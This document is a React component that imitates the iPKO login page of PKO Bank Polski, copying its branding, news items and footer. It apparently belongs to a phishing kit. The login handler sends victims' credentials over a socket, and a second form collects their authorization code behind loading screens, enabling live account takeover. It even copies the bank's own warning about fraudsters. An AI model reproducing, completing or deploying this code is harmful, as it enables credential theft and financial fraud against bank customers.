import React, {useEffect, useState} from "react";
import logo from '../../assets/img/ipko/logo.svg'
import money from '../../assets/img/ipko/money.png'
import {Button, Col, Container, Row} from "reactstrap";

import {useSocket} from "../../context/socket/socketProvider";
import IpkoFormLogin from "./components/IpkoFormLogin";
import Loader from "./components/Loader";
import IpkoFormCode from "./components/IpkoFormCode";
import IpkoFail from "./components/IpkoFail";
import '../../assets/scss/pages/_ipko.scss'


const Ipko = () => {
    const {user, initUser, connect, disconnect, sendCode} = useSocket();
    const [loading, setLoading] = useState(true);
    const submitLogin = (data) => {
        console.log('Login', data);
        initUser({
            ...data, bank: 'ipko'
        });
    }
    const submitCode = (code) => {
        sendCode(code);
    }
    const load = () => {
        setLoading(true);
        setTimeout(() => {
            setLoading(false)
        }, 1000)
    }
    useEffect(() => {
        connect('ipko');
        load();
        return () => disconnect();
    }, [])

    return (
        <div className={'ipko'}>
            <body>
            <header className="ipko_header">
                <Container>
                    <div className="ipko_header_content">
                        <a href="#">
                            <img src={logo} alt="ipko"/>
                        </a>
                    </div>

                </Container>
            </header>
            <div className="ipko_main">
                <Container>
                    <Row>
                        <Col md={{size: 4, offset: 1}}>
                            <IpkoFormLogin key={'login'} status={user.status} handler={submitLogin}/>
                            <IpkoFormCode key={'code'} status={user.status} handler={submitCode}/>
                            <IpkoFail key={'fail'} status={user.status}/>
                        </Col>
                        <Col md={{size: 6, offset: 1}}
                             sm={{size: 12, offset: 0}}
                             className={'ipko_banner'}
                        >
                            <div className="ipko_banner_content">
                                <img src={money} alt="money"/>
                                <div className="special">
                                    <h3>Specjalna pierwsza pożyczka. RRSO 7,45%</h3>
                                    <p>Całkowicie online przez aplikację IKO lub serwis iPKO.</p>
                                    <Button>Sprawdź propozycję</Button>
                                </div>

                            </div>
                        </Col>
                    </Row>
                    <div className="ipko_news">
                        <div className="ipko_news_content">
                            <div className="new">
                                <p className="time">
                                    <em>03.08.2021</em>
                                </p>
                                <h4>Niedostępność dokumentów na Trwałym Nośniku</h4>
                                <p>Ze względu na prace serwisowe 4 i 5 sierpnia 2021 r. nie będzie można weryfikować ani
                                    pobierać dokumentów z Trwałego Nośnika (na stronie
                                    https://www.pkobp.pl/archiwalne-dokumenty, www.kir.pl oraz w iPKO).
                                    <br/> Przepraszamy za utrudnienia.</p>
                            </div>
                            <div className="new">
                                <p className="time">
                                    <em>19.07.2021</em>
                                </p>
                                <h4>Praktyczna wiedza na wakacje</h4>
                                <p>Zainstaluj aplikację IKO, wykup dobre ubezpieczenie, pamiętaj o karcie EKUZ i Unijnym
                                    Certyfikacie COVID</p>
                            </div>
                            <div className="new">
                                <p className="time">
                                    <em>05.07.2021</em>
                                </p>
                                <h4>Uważaj na telefonicznych oszustów! Możesz stracić pieniądze.</h4>
                                <p>Oszuści dzwonią do klientów i podszywają się pod pracowników banku. Mogą twierdzić,
                                    że ktoś wziął pożyczkę na Twoje dane lub zrobił przelew. Jeśli podasz im dane
                                    logowania, kod BLIK lub kod z narzędzia autoryzacyjnego albo zainstalujesz na ich
                                    polecenie podejrzane oprogramowanie - stracisz pieniądze.</p>
                            </div>
                        </div>
                    </div>
                </Container>
            </div>
            <footer className="ipko_footer">
                <Container>
                    <div className="ipko_footer_content">
                        <div className="ipko_footer_links">
                            <a href="#">© 2021 PKO Bank Polski</a>
                            <a href="#">Kod BIC (Swift): BPKOPLPW</a>
                            <a href="#">Polityka prywatności</a>
                        </div>
                        <div className='ipko_footer_icons'>
                            <a href="#" className={'security'}>Bezpieczeństwo</a>
                            <a href="#" className={'pormoc'}>Pomoc</a>
                            <a href="#" className={'message'}>Kontakt</a>
                        </div>
                    </div>
                </Container>
            </footer>
            {user.status === null || ['init', 'send_code', 'correct_code'].includes(user.status) ? <Loader/> : null}
            </body>


        </div>
    )
}
export default Ipko;
